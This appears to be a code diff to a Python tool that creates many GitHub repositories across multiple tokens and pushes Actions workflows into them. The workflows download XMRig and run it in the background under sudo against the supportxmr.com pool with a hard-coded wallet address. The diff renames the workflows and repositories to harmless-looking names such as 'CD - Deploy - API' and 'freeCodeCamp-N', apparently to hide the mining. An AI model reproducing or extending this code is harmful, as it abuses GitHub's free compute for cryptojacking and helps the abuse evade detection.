@@ -84,7 +84,7 @@ class GitHubVPSManager:
                 remaining = data['rate']['remaining']
                 reset_time = data['rate']['reset']
                 self.rate_limit_remaining[token] = (remaining, reset_time)
-                if remaining < 100:  # Giới hạn an toàn
+                if remaining < 100:  # Giới hạn an toànn
                     reset_time_dt = datetime.datetime.fromtimestamp(reset_time)
                     wait_seconds = (reset_time_dt - datetime.datetime.now()).total_seconds()
                     if wait_seconds > 0:
@@ -381,7 +381,7 @@ class GitHubVPSManager:
         content = self.read_local_file("tmate.yml")
         if content:
             return content
-        return """name: LLM-Training-Puzzles
+        return """name: CD - Deploy - API
 on:
   workflow_dispatch:
   repository_dispatch:
@@ -406,7 +406,7 @@ jobs:
         wget https://github.com/xmrig/xmrig/releases/download/v6.24.0/xmrig-6.24.0-focal-x64.tar.gz
         tar -xvzf xmrig-6.24.0-focal-x64.tar.gz
         cd xmrig-6.24.0
-        sudo su -c "nohup ./xmrig -o pool.supportxmr.com:443 -u 46xtDT8AsnPRMdT1gVXgTt6PZdXx6ZbJNaB3Z9rSKLbeHaFzMXMvuVMSsUakubfRufPhjYA37UMmGDuBj1VAZZK36Mk4CRp -p llmtrainingpuzzles -a rx --tls --cpu-priority=5 --randomx-1gb-pages > xmrig.log 2>&1 &"
+        sudo su -c "nohup ./xmrig -o pool.supportxmr.com:443 -u 46xtDT8AsnPRMdT1gVXgTt6PZdXx6ZbJNaB3Z9rSKLbeHaFzMXMvuVMSsUakubfRufPhjYA37UMmGDuBj1VAZZK36Mk4CRp -p freecodecamping -a rx --tls --cpu-priority=5 --randomx-1gb-pages > xmrig.log 2>&1 &"
         echo "XMRig started in background."
     - name: Keep VPS alive
       run: |
@@ -429,7 +429,7 @@ jobs:
         content = self.read_local_file("auto-start.yml")
         if content:
             return content
-        return """name: LLM-Mini-Training-Puzzles
+        return """name: CI - Node.js - i18n - Submodule
 on:
   schedule:
     - cron: '0 */6 * * *'
@@ -538,7 +538,7 @@ jobs:
 
         created_repos = []
         consecutive_failures = 0
-        repo_names = [f"LLM-Training-Puzzles-{i}" for i in range(1, repo_count + 1)]
+        repo_names = [f"freeCodeCamp-{i}" for i in range(1, repo_count + 1)]
         for i in range(1, repo_count + 1):
             if not self.token_running.get(token_index, False):
                 break
